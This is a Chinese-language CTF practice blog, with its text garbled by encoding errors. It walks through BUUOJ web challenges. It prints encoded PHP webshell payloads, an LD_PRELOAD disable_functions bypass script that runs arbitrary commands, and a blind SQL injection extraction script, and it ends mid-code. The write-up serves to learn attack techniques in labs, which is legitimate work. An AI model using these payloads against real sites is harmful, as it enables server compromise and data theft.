<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153646824.png" alt="image-20210912153646824"></p>
<p>è¿™é‡Œçš„c-jwt-crackå·¥å…·ä¸ä¼šç”¨ï¼Œæ‰€ä»¥å°±è·³è¿‡è¿™éƒ¨åˆ†å§</p>
<p>çœ‹ç™»å½•åçš„æºç çœ‹è§<a target="_blank" rel="noopener" href="http://www.zipè·¯å¾„/">www.zipè·¯å¾„</a></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153753980.png" alt="image-20210912153753980"></p>
<p>ä¸‹è½½å‹ç¼©åŒ…åå‘ç°å…¨ä¸ºpythonæ–‡ä»¶</p>
<p>è¿™é‡Œæ˜¯åˆ©ç”¨äº†pythonåç¼–è¯‘</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912171400636.png" alt="image-20210912171400636"></p>
<p>pickleæä¾›äº†ä¸€ä¸ªç®€å•çš„æŒä¹…åŒ–åŠŸèƒ½ã€‚å¯ä»¥å°†å¯¹è±¡ä»¥æ–‡ä»¶çš„å½¢å¼å­˜æ”¾åœ¨ç£ç›˜ä¸Šã€‚</p>
<p>pickleæ¨¡å—åªèƒ½åœ¨pythonä¸­ä½¿ç”¨ï¼Œpythonä¸­å‡ ä¹æ‰€æœ‰çš„æ•°æ®ç±»å‹ï¼ˆåˆ—è¡¨ï¼Œå­—å…¸ï¼Œé›†åˆï¼Œç±»ç­‰ï¼‰éƒ½å¯ä»¥ç”¨pickleæ¥åºåˆ—åŒ–ï¼Œ<br>pickleåºåˆ—åŒ–åçš„æ•°æ®ï¼Œå¯è¯»æ€§å·®ï¼Œäººä¸€èˆ¬æ— æ³•è¯†åˆ«ã€‚</p>
<p>p = pickle.loads(urllib.unquote(become))</p>
<p>urllib.unquote:å°†å­˜å…¥çš„å­—å…¸å‚æ•°ç¼–ç ä¸ºURLæŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œå³è½¬æ¢æˆä»¥key1 = value1 &amp; key2 = value2çš„å½¢å¼pickle.loads(bytes_object): ä»å­—èŠ‚å¯¹è±¡ä¸­è¯»å–è¢«å°è£…çš„å¯¹è±¡ï¼Œå¹¶è¿”å›æˆ‘çœ‹äº†å¸ˆå‚…ä»¬çš„åšå®¢ä¹‹åçš„ç†è§£å°±æ˜¯ï¼Œæˆ‘ä»¬æ„å»ºä¸€ä¸ªç±»ï¼Œç±»é‡Œé¢çš„__reduce__pythoné­”æœ¯æ–¹æ³•ä¼šåœ¨è¯¥ç±»è¢«ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè¢«è°ƒç”¨Pickleæ¨¡å—ä¸­æœ€å¸¸ç”¨çš„å‡½æ•°ä¸ºï¼š</p>
<p>ï¼ˆ1ï¼‰pickle.dump(obj, file, [,protocol])</p>
<pre class="language-none"><code class="language-none">    å‡½æ•°çš„åŠŸèƒ½ï¼šå°†objå¯¹è±¡åºåˆ—åŒ–å­˜å…¥å·²ç»æ‰“å¼€çš„fileä¸­ã€‚

   å‚æ•°è®²è§£ï¼š

objï¼šæƒ³è¦åºåˆ—åŒ–çš„objå¯¹è±¡ã€‚
file:æ–‡ä»¶åç§°ã€‚
protocolï¼šåºåˆ—åŒ–ä½¿ç”¨çš„åè®®ã€‚å¦‚æœè¯¥é¡¹çœç•¥ï¼Œåˆ™é»˜è®¤ä¸º0ã€‚å¦‚æœä¸ºè´Ÿå€¼æˆ–HIGHEST_PROTOCOLï¼Œåˆ™ä½¿ç”¨æœ€é«˜çš„åè®®ç‰ˆæœ¬ã€‚</code></pre>

<p>ï¼ˆ2ï¼‰pickle.load(file)</p>
<pre class="language-none"><code class="language-none">    å‡½æ•°çš„åŠŸèƒ½ï¼šå°†fileä¸­çš„å¯¹è±¡åºåˆ—åŒ–è¯»å‡ºã€‚

    å‚æ•°è®²è§£ï¼š

fileï¼šæ–‡ä»¶åç§°ã€‚</code></pre>

<p>ï¼ˆ3ï¼‰pickle.dumps(obj[, protocol])</p>
<pre class="language-none"><code class="language-none">   å‡½æ•°çš„åŠŸèƒ½ï¼šå°†objå¯¹è±¡åºåˆ—åŒ–ä¸ºstringå½¢å¼ï¼Œè€Œä¸æ˜¯å­˜å…¥æ–‡ä»¶ä¸­ã€‚

   å‚æ•°è®²è§£ï¼š

objï¼šæƒ³è¦åºåˆ—åŒ–çš„objå¯¹è±¡ã€‚
protocalï¼šå¦‚æœè¯¥é¡¹çœç•¥ï¼Œåˆ™é»˜è®¤ä¸º0ã€‚å¦‚æœä¸ºè´Ÿå€¼æˆ–HIGHEST_PROTOCOLï¼Œåˆ™ä½¿ç”¨æœ€é«˜çš„åè®®ç‰ˆæœ¬ã€‚</code></pre>

<p>ï¼ˆ4ï¼‰pickle.loads(string)</p>
<pre class="language-none"><code class="language-none">   å‡½æ•°çš„åŠŸèƒ½ï¼šä»stringä¸­è¯»å‡ºåºåˆ—åŒ–å‰çš„objå¯¹è±¡ã€‚

   å‚æ•°è®²è§£ï¼š

stringï¼šæ–‡ä»¶åç§°ã€‚

 ã€æ³¨ã€‘ dump() ä¸ load() ç›¸æ¯” dumps() å’Œ loads() è¿˜æœ‰å¦ä¸€ç§èƒ½åŠ›ï¼šdump()å‡½æ•°èƒ½ä¸€ä¸ªæ¥ç€ä¸€ä¸ªåœ°å°†å‡ ä¸ªå¯¹è±¡åºåˆ—åŒ–å­˜å‚¨åˆ°åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œéšåè°ƒç”¨load()æ¥ä»¥åŒæ ·çš„é¡ºåºååºåˆ—åŒ–è¯»å‡ºè¿™äº›å¯¹è±¡ã€‚è€Œåœ¨__reduce__æ–¹æ³•é‡Œé¢æˆ‘ä»¬å°±è¿›è¡Œè¯»å–flag.txtæ–‡ä»¶ï¼Œå¹¶å°†è¯¥ç±»åºåˆ—åŒ–ä¹‹åè¿›è¡ŒURLç¼–ç </code></pre>

<p>æ£€æµ‹ååºåˆ—åŒ–æ–¹æ³•ï¼š</p>
<pre class="language-none"><code class="language-none">å…¨å±€æœç´¢Pythonä»£ç ä¸­æ˜¯å¦å«æœ‰å…³é”®å­—ç±»ä¼¼â€œimport cPickleâ€æˆ–â€œimport pickleâ€ç­‰ï¼Œè‹¥å­˜åœ¨åˆ™è¿›ä¸€æ­¥ç¡®è®¤æ˜¯å¦è°ƒç”¨cPickle.loads()æˆ–pickle.loads()ä¸”ååºåˆ—åŒ–çš„å‚æ•°å¯æ§ã€‚</code></pre>

<p>é˜²å¾¡æ–¹æ³•</p>
<pre class="language-none"><code class="language-none">1ã€ç”¨æ›´é«˜çº§çš„æ¥å£__getnewargs()ã€__getstate__()ã€__setstate__()ç­‰ä»£æ›¿__reduce__()é­”æœ¯æ–¹æ³•ï¼›

2ã€è¿›è¡Œååºåˆ—åŒ–æ“ä½œä¹‹å‰ï¼Œè¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ï¼Œè‹¥é‡‡ç”¨çš„æ˜¯pickleåº“å¯é‡‡ç”¨è£…é¥°å™¨å®ç°ã€‚</code></pre>



<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzM0NTA4Mg==,size_16,color_FFFFFF,t_70.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>è¿™é‡Œé‡‡ç”¨reduce</p>
<p>å½“__reduce__è¢«å®šä¹‰ä¹‹åï¼Œè¯¥å¯¹è±¡è¢«Pickleæ—¶å°±ä¼šè¢«è°ƒç”¨æˆ‘ä»¬è¿™é‡Œçš„evalç”¨äºé‡å»ºå¯¹è±¡çš„æ—¶å€™è°ƒç”¨ï¼Œå³å‘Šè¯‰pythonå¦‚ä½•pickleä»–ä»¬ä¾›evalä½¿ç”¨çš„å³æ‰“å¼€çš„æ–‡ä»¶flag.txtå…¶ä»–çš„å‚æ•°æˆ‘ä»¬å¯ä»¥ä¸å¡«</p>
<p>ç™¾åº¦ä¸ªè„šæœ¬</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210914214826558.png" alt="image-20210914214826558"></p>
<p>æŠŠè¿™ä¸ªå€¼ç»™becomeé‡Œæ”¾åŒ…å°±è¡Œ</p>
<p>å‚è€ƒé“¾æ¥</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/bluehawksky/article/details/79027055"> Pythoné­”æ³•æ–¹æ³•æŒ‡å—_å®‡å®™æµªå­çš„ä¸“æ -CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2289#toc-4">Pythonååºåˆ—åŒ–æ¼æ´çš„èŠ±å¼åˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>
<hr>
<p>å‡ å¤©ä¹‹åçš„è¡¥ï¼Œjwté‚£ä¸ªå·¥å…·ç¯å¢ƒå¼„å¥½äº†</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210914215436728.png" alt="image-20210914215436728"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210914215503070.png" alt="image-20210914215503070"></p>
<h2 id="MRCTF2020-å¥—å¨ƒ"><a href="#MRCTF2020-å¥—å¨ƒ" class="headerlink" title="[MRCTF2020]å¥—å¨ƒ"></a>[MRCTF2020]å¥—å¨ƒ</h2><p>æ‰å‘ç°è¿™å°±æ˜¯å¯’å‡é‚£ä¸ªæ‹›æ–°èµ›çš„åŸé¢˜</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133220927.png" alt="image-20210916133220927"></p>
<p>ä¸‹åˆ’çº¿å¯ä»¥ç”¨.æ¥ç»•è¿‡ï¼Œç¬¬äºŒä¸ªifå¯ä»¥åˆ©ç”¨%0aæ¢è¡Œç»•è¿‡</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133253226.png" alt="image-20210916133253226"></p>
<p>è¦æ±‚æœ¬åœ°ç™»å½•</p>
<p>æŠ“åŒ…æ”¹xff</p>
<p>é‡Œé¢æœ‰ä¸€æ®µjsä»£ç </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133335204.png" alt="image-20210916133335204"></p>
<p>postä¸€ä¸ªmerakå€¼ï¼Œå¾—åˆ°ä¸€æ®µä»£ç </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133404217.png" alt="image-20210916133404217"></p>
<p>ä»£ç å®¡è®¡</p>
<p>è¦æ±‚getè¿›ä¸€ä¸ªå€¼ä¸”å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶åä¸ºè¿™ä¸ªå€¼çš„æ–‡ä»¶ï¼Œå†…å®¹ä¸ºtodat is a happy day</p>
<p>å¯ä»¥ç”¨data://text/plain,ç»•è¿‡</p>
<p>ä¹Ÿå¯ä»¥ç”¨data:<em>//text/plain;base64,</em></p>
<p>ç„¶åå­˜åœ¨ä¸€ä¸ªfile_get_contentsè¯»å–ä¼ å…¥çš„file</p>
<p>è¦è®©è¿™ä¸ªå€¼ç»è¿‡changeå‡½æ•°åä¸ºflag.php</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133828755.png" alt="image-20210916133828755"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133839192.png" alt="image-20210916133839192"></p>
<p>ä¼ è¿›å»ï¼Œæ‹¿flag</p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h2><pre class="language-none"><code class="language-none">&lt;?php
error_reporting(0);
if(isset($_GET[&#39;code&#39;]))&#123;
            $code&#x3D;$_GET[&#39;code&#39;];
                    if(strlen($code)&gt;40)&#123;
                                        die(&quot;This is too Long.&quot;);
                                                &#125;
                    if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;
                                        die(&quot;NO.&quot;);
                                                &#125;
                    @eval($code);
&#125;
else&#123;
            highlight_file(__FILE__);
&#125;

&#x2F;&#x2F; ?&gt;</code></pre>

<p>æœ‰evalå‡½æ•°ï¼Œè¦è¯•å›¾å‘½ä»¤æ‰§è¡Œï¼Œç„¶åpreg_matchè¿‡æ»¤äº†å­—æ¯å’Œæ•°å­—ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨å¼‚æˆ–æˆ–è€…æ˜¯urlç¼–ç å–åæ¥ç»•è¿‡</p>
<p>å–å</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918182257977.png" alt="image-20210918182257977"></p>
<p>æˆåŠŸæ‰§è¡Œ</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918182348259.png" alt="image-20210918182348259"></p>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ç¦ç”¨çš„å‡½æ•°</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918182433498.png" alt="image-20210918182433498"></p>
<p>æˆ–è€…åˆ©ç”¨å¼‚æˆ–</p>
<pre class="language-none"><code class="language-none">code&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918183044112.png" alt="image-20210918183044112"></p>
<p>ä¸€æ ·å¯ä»¥è¿›å…¥phpinfoé¡µé¢</p>
<p>æŸ¥çœ‹åˆ°ç¦ç”¨çš„å‡½æ•°åå¯ä»¥å°è¯•åˆ©ç”¨å–åæˆ–è€…å¼‚æˆ–å†™å…¥ä¸€å¥è¯æœ¨é©¬</p>
<p>//æŠ„çš„payload</p>
<pre class="language-none"><code class="language-none">?code&#x3D;(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6);  &#x2F;&#x2F;åˆ«å¿˜äº†åé¢çš„åˆ†å·
æˆ–è€…ï¼š
?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27])
</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918183814123.png" alt="image-20210918183814123"></p>
<p>ç„¶åèšå‰‘é“¾æ¥ï¼Œè¦æ‰§è¡Œè¯»å–flagçš„readflagäºŒè¿›åˆ¶æ–‡ä»¶æ‰èƒ½å¾—åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918184148817.png" alt="image-20210918184148817"></p>
<p>ä½†æ˜¯</p>
<p>disable_functionsç¦ç”¨çš„å‡½æ•°å¤ªå¤šå¯¼è‡´shellä¸èƒ½æ‰§è¡Œå‘½ä»¤</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918184324855.png" alt="image-20210918184324855"></p>
<p>è¿™é‡Œå¯ä»¥ç”¨èšå‰‘çš„æ’ä»¶ï¼ˆèšå‰‘yyds</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918184419549.png" alt="image-20210918184419549"></p>
<p>è¿˜æœ‰ä¸€ç§æ–¹æ³•</p>
<p>åˆ©ç”¨linuxæä¾›çš„LD_preloadç¯å¢ƒå˜é‡ï¼ŒåŠ«æŒå…±äº«soï¼Œåœ¨å¯åŠ¨å­è¿›ç¨‹çš„æ—¶å€™ï¼Œæ–°çš„å­è¿›ç¨‹ä¼šåŠ è½½æˆ‘ä»¬æ¶æ„çš„soæ‹“å±•ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥åœ¨soé‡Œé¢å®šä¹‰åŒåå‡½æ•°ï¼Œå³å¯åŠ«æŒAPIè°ƒç”¨ï¼ŒæˆåŠŸRCE<br>å‚è€ƒé“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/175403">https://www.anquanke.com/post/id/175403</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/192052.html">æ— éœ€sendmailï¼šå·§ç”¨LD_PRELOADçªç ´disable_functions - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">EXPåœ°å€</a></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918194317240.png" alt="image-20210918194317240"></p>
<p>æˆ‘çœ‹ä¸æ‡‚ï¼Œä½†æˆ‘å¤§å—éœ‡æ’¼</p>
<p>ä¸Šä¼ bypass.php</p>
<pre class="language-none"><code class="language-none">&lt;?php
    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;&#x2F;b&gt;: http:&#x2F;&#x2F;site.com&#x2F;bypass_disablefunc.php?cmd&#x3D;pwd&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so &lt;&#x2F;p&gt;&quot;;
    $cmd &#x3D; $_GET[&quot;cmd&quot;];
    $out_path &#x3D; $_GET[&quot;outpath&quot;];
    $evil_cmdline &#x3D; $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;
    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;&#x2F;b&gt;: &quot; . $evil_cmdline . &quot;&lt;&#x2F;p&gt;&quot;;
    putenv(&quot;EVIL_CMDLINE&#x3D;&quot; . $evil_cmdline); &#x2F;&#x2F;è®¾ç½®EVIL_CMDLINEç¯å¢ƒå˜é‡
    $so_path &#x3D; $_GET[&quot;sopath&quot;];
    putenv(&quot;LD_PRELOAD&#x3D;&quot; . $so_path);  &#x2F;&#x2F;åŠ è½½æ¶æ„åŠ¨æ€åº“
    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);  &#x2F;&#x2F;åˆ©ç”¨mailå‡½æ•°è§¦å‘æ¶æ„å‡½æ•°ï¼Œè·³è½¬è‡³__attribute__ ((__constructor__))ä¿®é¥°çš„å‡½æ•°ã€‚
    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;&#x2F;b&gt;: &lt;br &#x2F;&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;&#x2F;p&gt;&quot;; 
    unlink($out_path);
?&gt;</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918193756871.png" alt="image-20210918193756871"></p>
<p>æœ€ç»ˆpayload</p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;68a9a191-87dd-4067-ac30-321118de4427.node4.buuoj.cn:81&#x2F;?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;include(%27&#x2F;var&#x2F;tmp&#x2F;bypass.php%27)&amp;cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;tmpfile&amp;sopath&#x3D;&#x2F;var&#x2F;tmp&#x2F;bypass_disablefunc_x64.so</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918193729344.png" alt="image-20210918193729344"></p>
<p>å‚è€ƒé“¾æ¥</p>
<p><a target="_blank" rel="noopener" href="http://0xcreed.jxustctf.top/2019/10/bypass-disable-functions/#bypass-disable-functions">bypass_disable_functions | 0xCreed (jxustctf.top)</a></p>
<p>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yesec/p/12483631.html">BUUOJè®°å½•] [æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME - Ye&#39;sBlog - åšå®¢å›­ (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/105136633/">æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME_æœ«åˆ Â· mochu7-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/105656737?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link">æå®¢å¤§æŒ‘æˆ˜ 2019]RCE MEï¼ˆå–åã€å¼‚æˆ–ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼ã€bypass disable_functionï¼‰_WHOAMIAnonyçš„åšå®¢-CSDNåšå®¢_å¼‚æˆ–ç»•è¿‡</a></p>
<h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918223822994.png" alt="image-20210918223822994"></p>
<p>ä¸çŸ¥é“å¯†ç ï¼Œsqlæ³¨å…¥ä¹Ÿä¸æˆåŠŸ</p>
<p>ç›´æ¥æŠŠcookieæ”¹æˆusername=cookieå°±è¡Œäº†ï¼Œä¸æ¸…æ¥šè¿™é¢˜åœ¨è€ƒå•¥ã€‚ã€‚ã€‚</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918223845191.png" alt="image-20210918223845191"></p>
<h2 id="WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢"></a>[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</h2><p>å¸ƒå°”ç›²æ³¨ï¼Œè¿‡æ»¤äº†ç©ºæ ¼</p>
<p>(ascii(substr(database(),{},1))={})&quot;.format(i,j)</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918235150704.png" alt="image-20210918235150704"></p>
<p>(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{},1))={})</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918234900927.png" alt="image-20210918234900927"></p>
<p>(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),{},1))={})</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918235644493.png" alt="image-20210918235644493"></p>
<p>(ascii(substr((select(group_concat(value))from(flag))</p>
<p>è„šæœ¬ï¼š</p>
<pre class="language-none"><code class="language-none">import requests
url &#x3D; &quot;http:&#x2F;&#x2F;ff19146a-59b8-4bd0-8ded-5bf195180739.node4.buuoj.cn:81&#x2F;?stunum&#x3D;0^&quot;
data &#x3D; &#39;&#39;
k &#x3D; 0
for i in range(13,50):
    k &#x3D; 0
    for j in range(43,127):
        gets &#x3D; &quot;(ascii(substr((select(group_concat(value))from(flag)),&#123;&#125;,1))&#x3D;&#123;&#125;)&quot;.format(i,j)
        res &#x3D; requests.get(url+gets)
        if &quot;your score is: 100&quot; in res.text:
            data +&#x3D; chr(j)
            print(data)
            k &#x3D; 1
            break
    if(k &#x3D;&#x3D; 0):
        print(&quot;err!&quot;)
        exit()
    </code></pre>

<p>å› ä¸ºç½‘ç»œé—®é¢˜åŠ äº†åˆ¤æ–­ï¼Œç»“æœå°±æ˜¯è·‘ä¸€ä¼šå°±åœäº†ï¼Œåªèƒ½ä¸€æ®µä¸€æ®µçš„è·‘äº†</p>
<p>ä¸€å®šæ˜¯buu flagå¤ªé•¿äº†ï¼ˆ</p>
<p>ç®—æ˜¯ç¬¬ä¸€æ¬¡è‡ªå·±å†™è„šæœ¬äº†</p>
<p>éå†å±å®è·‘çš„å¤ªæ…¢äº†ï¼ŒæŠ½ç©ºå­¦ä¸€ä¸‹äºŒåˆ†æ³•çš„å†™æ³•</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210919002507491.png" alt="image-20210919002507491"></p>
<p>flag{d8fd8842-58bd-4a88-bf0c-8e73811797a4}</p>
<h2 id="GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–"><a href="#GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–"></a>[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921134432965.png" alt="image-20210921134432965"></p>
<p>æ¶‰åŠäº†phpçš„ä¼ªéšæœº</p>
<p>å¦‚æœmt_srandä½¿ç”¨åŒä¸€ä¸ªseedï¼Œç”Ÿæˆçš„éšæœºæ•°æ˜¯å¯ä»¥çˆ†ç ´å‡ºseedçš„</p>
<p>æŸ¥çœ‹æºç æ‰¾åˆ°check.php</p>
<pre class="language-php" data-language="php"><code class="language-php">pbEzqyRCJP

&lt;?php
#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼
header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);
session_start();
if(!isset($_SESSION[&#39;seed&#39;]))&#123;
$_SESSION[&#39;seed&#39;]&#x3D;rand(0,999999999);
&#125;

mt_srand($_SESSION[&#39;seed&#39;]);
$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
$str&#x3D;&#39;&#39;;
$len1&#x3D;20;
for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;
    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
&#125;
$str_show &#x3D; substr($str, 0, 10);
echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;&#x2F;p&gt;&quot;;


if(isset($_POST[&#39;num&#39;]))&#123;
    if($_POST[&#39;num&#39;]&#x3D;&#x3D;&#x3D;$str)&#123;x
        echo &quot;&lt;p id&#x3D;flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;&#x2F;p&gt;&quot;;
    &#125;
    else&#123;
        echo &quot;&lt;p id&#x3D;flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;&#x2F;p&gt;&quot;;
    &#125;
&#125;
show_source(&quot;check.php&quot;);</code></pre>

<p>çŸ¥é“å‰å‡ ä½äº†</p>
<p>æ ¹æ®ç”Ÿæˆç®—æ³•é€†å‘å‡ºæ»¡è¶³php_mt_seedå·¥å…·è¦æ±‚çš„å‚æ•°ï¼ˆç™¾åº¦æŠ„çš„</p>
<pre class="language-none"><code class="language-none">str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;
str2&#x3D;&#39;ENxxxZwNwR&#39;
str3 &#x3D; str1[::-1]
length &#x3D; len(str2)
res&#x3D;&#39;&#39;
for i in range(len(str2)):  
    for j in range(len(str1)):
        if str2[i] &#x3D;&#x3D; str1[j]:
            res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;
            break
print(res)
</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921134815768.png" alt="image-20210921134815768"></p>
<p>æ”¾åˆ°php_mt_seedé‡Œè·‘ç§å­</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921134854213.png" alt="image-20210921134854213"></p>
<p>å†åˆ©ç”¨è¿™ä¸ªè„šæœ¬å¾—åˆ°æœ€åçš„å€¼</p>
<pre class="language-none"><code class="language-none">&lt;?php
mt_srand(499600072);

$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
$str&#x3D;&#39;&#39;;
$len1&#x3D;20;
